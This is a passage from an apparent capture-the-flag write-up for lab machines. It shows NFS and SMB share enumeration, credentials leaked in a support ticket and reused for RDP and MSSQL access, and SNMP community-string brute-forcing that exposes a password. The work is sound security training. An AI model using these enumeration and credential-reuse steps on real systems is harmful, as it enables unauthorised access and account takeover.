| 2049/tcp | `nlockmgr` | 1-4 (RPC #100021) | Network File System (NFS) |
| 3389/tcp | `ms-wbt-server` | Microsoft Terminal Services | Remote Desktop Protocol (RDP) |
| 5985/tcp | `http` | Microsoft HTTPAPI httpd 2.0 | Windows Remote Management (WinRM) |

We have a list of actions to conduct:
1. SMB (445) — enumerate shares with `smbclient` or `crackmapexec`
2. NFS (2049) — check for exposed shares with `showmount -e 10.129.202.41`
3. WinRM (5985) — if we get credentials, use `evil-winrm` for a shell
4. RDP (3389) — GUI access if credentials are found

## Exploring NFS
Let's see what NFS shares there are:
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ showmount -e 10.129.202.41
Export list for 10.129.202.41:
/TechSupport (everyone)
```

A `TechSupport` share exists. Let's mount it and explore its contents.
```bash
mkdir: cannot create directory ‘/mnt/TechSupport’: Permission denied
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ mkdir target-NFS
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ sudo mount -t nfs 10.129.202.41:/TechSupport target-NFS
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ sudo ls -la target-NFS/
total 72
drwx------  2 nobody         nogroup        65536 Nov 10  2021 .
drwx------ 22 htb-ac-2300483 htb-ac-2300483  4096 Sep  1 03:05 ..
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283649.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283650.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283651.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283652.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283653.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283654.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283655.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283656.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283657.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283658.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283659.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283660.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283661.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283662.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283663.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283664.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283665.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283666.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283667.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283668.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283669.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283670.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283671.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283672.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283673.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283674.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283675.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283676.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283677.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283678.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283679.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283680.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283681.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283682.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283683.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283684.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283685.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283686.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283687.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283688.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283689.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283690.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283691.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283692.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283693.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283694.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283695.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283696.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283697.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283698.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283699.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283700.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283701.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283702.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283703.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283704.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283705.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283706.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283707.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283708.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283709.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283710.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283711.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283712.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283713.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283714.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283715.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283716.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283717.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283718.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283719.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283720.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283721.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283722.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283723.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283724.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283725.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283726.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283727.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283728.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283729.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283730.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283731.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283732.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283733.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283734.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283735.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283736.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283737.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283738.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283739.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283740.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283741.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283742.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283743.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283744.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283745.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283746.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283747.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283748.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283749.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283750.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283751.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283752.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283753.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283754.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283755.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283756.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283757.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283758.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283759.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283760.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283761.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283762.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283763.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283764.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283765.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283766.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283767.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283768.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283769.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283770.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283771.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283772.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283773.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283774.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283775.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283776.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283777.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283778.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283779.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283780.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283781.txt
-rwx------  1 nobody         nogroup         1305 Nov 10  2021 ticket4238791283782.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283783.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283784.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283785.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283786.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283787.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283788.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283789.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283790.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283791.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283792.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283793.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283794.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283795.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283796.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283797.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283798.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283799.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283800.txt
-rwx------  1 nobody         nogroup            0 Nov 10  2021 ticket4238791283801.txt
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ sudo cat ~/target-NFS/ticket4238791283782.txt
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17    	withUserNameSupport=false
18    	sendWelcomeEmail=true
19    	enableGravatarSupport=true
20    	signupSkipLogin=true
21    	tokenDuration=60
22    	tokenDeleteInterval=5
23    	minimumPasswordLength=8
24    	enableTokenJob=true
25    	hasher=bcrypt
26	}
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   



---
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ 
```
One file stands out and it is the only non-empty file. Every other file is 0 bytes, but `ticket4238791283782.txt` is 1305 bytes. Upon reading it, we found a set of credentials leaked in a support ticket:
- Username: `alex`
- Password: `lol123!mD`

Let's explore the other services with these set of credentials.

## Exploring SMB
We use `alex:lol123!mD` to access the SMB service.
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ smbclient -L //10.129.202.41 -U alex
Password for [WORKGROUP\alex]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	devshare        Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available
```
There are 2 interesting shares: `devshare` and `Users`.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ smbclient //10.129.202.41/devshare -U alex
Password for [WORKGROUP\alex]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 10 11:12:22 2021
  ..                                  D        0  Wed Nov 10 11:12:22 2021
  important.txt                       A       16  Wed Nov 10 11:12:55 2021

		10328063 blocks of size 4096. 6096859 blocks available
smb: \> get important.txt
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ cat important.txt 
sa:87N1ns@slls83┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
```
Upon enumerating the `devshare` SMB share, we find another credential set:
- Username: `sa`
- Password: `87N1ns@slls83`

`sa` is the SQL server Administrator account, which is the default sysadmin for Microsoft SQL server. Let's check if MSSQL is running on the system:

```bash
└──╼ [★]$ nmap -p 1433 10.129.202.41
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 03:19 EDT
Nmap scan report for 10.129.202.41
Host is up (0.17s latency).

PORT     STATE  SERVICE
1433/tcp closed ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```
MSSQL is not running on the system. Let's pivot to something else.

## Exploring RDP
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ xfreerdp /u:alex /p:'lol123!mD' /v:10.129.202.41
```

We managed to log in to the machine via RDP on the user `alex`. What caught our eye right away in the Desktop was the presence of the Microsoft SQL Server Management Studio. Opening it revealed a log in panel to MSSQL.
![](../img/3_img/mssql.png)

Let's log in with the `sa` credentials which we have obtained beforehand. However it did not work.
![](../img/3_img/login_not_working.png)

Let's run MSSQL studio as the administrator instead. We input `sa`'s password.
![](../img/3_img/run_as_admin.png)

The log in worked. Let's navigate to the `Databases` folder, and then explore the `accounts` database. We managed to find a table that has `name:password` pairings.

![](../img/3_img/flag_found.png)
![](../img/3_img/full_flag.png)

The flag is `lnch7ehrdn43i7AoqVPK4zWR`.

# H. Footprinting Lab - Hard

## Nmap Scan
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ sudo nmap -sV 10.129.174.189
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 04:41 EDT
Nmap scan report for 10.129.174.189
Host is up (0.17s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.62 seconds
```

This is a machine running a mail server. Let's do more detailed scan on the ports related to IMAP and POP3.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ sudo nmap -sV 10.129.174.189 -p110,143,993,995 -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 04:44 EDT
Nmap scan report for 10.129.174.189
Host is up (0.24s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE CAPA PIPELINING TOP USER STLS UIDL SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: AUTH=PLAINA0001 more ENABLE STARTTLS have LOGIN-REFERRALS capabilities listed Pre-login SASL-IR ID OK LITERAL+ IMAP4rev1 post-login IDLE
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: more ENABLE AUTH=PLAINA0001 have LOGIN-REFERRALS capabilities Pre-login listed SASL-IR ID OK LITERAL+ IMAP4rev1 post-login IDLE
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: TOP RESP-CODES SASL(PLAIN) USER AUTH-RESP-CODE UIDL CAPA PIPELINING
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds
```

SSL certificate reveals the hostname `NIXHARD`.

Let's do a UDP scan too.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ sudo nmap -sU --top-ports 100 10.129.174.189
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 04:59 EDT
Nmap scan report for 10.129.174.189
Host is up (0.17s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 103.15 seconds
```
 
There is a `snmp` service running.

## Exploring SNMP
A more detailed version scan through Nmap reveals that the `snmp` version is `v3`.
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ sudo nmap -sU -sV -p 161 10.129.174.189
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 05:03 EDT
Nmap scan report for 10.129.174.189
Host is up (0.17s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds

```

Let's bruteforce the community strings:
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ sudo apt install onesixtyone
onesixtyone is already the newest version (0.3.4-1).
onesixtyone set to manually installed.
The following package was automatically installed and is no longer required:
  linux-image-6.12.73+deb13-amd64
Use 'sudo apt autoremove' to remove it.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 533
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.174.189
Scanning 1 hosts, 3219 communities
10.129.174.189 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

We found a string called `backup`. Let's explore it
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ snmpwalk -c backup -v1 10.129.174.189 .
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (167009) 0:27:50.09
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (15) 0:00:00.15
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (168458) 0:28:04.58
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 09 01 09 08 0B 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 162
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
